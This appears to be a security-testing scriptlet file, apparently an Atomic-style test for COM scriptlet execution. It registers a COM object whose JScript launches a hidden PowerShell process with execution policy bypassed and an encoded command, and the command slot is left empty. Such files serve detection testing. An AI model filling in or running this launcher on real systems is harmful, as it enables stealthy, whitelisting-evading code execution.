<?XML version="1.0"?>
<scriptlet>
<registration progid="Atomic" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
<script language="JScript">
<![CDATA[
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -ExecutionPolicy Bypass -NoProfile -EncodedCommand ", 0, false);
]]>
</script>
</registration>



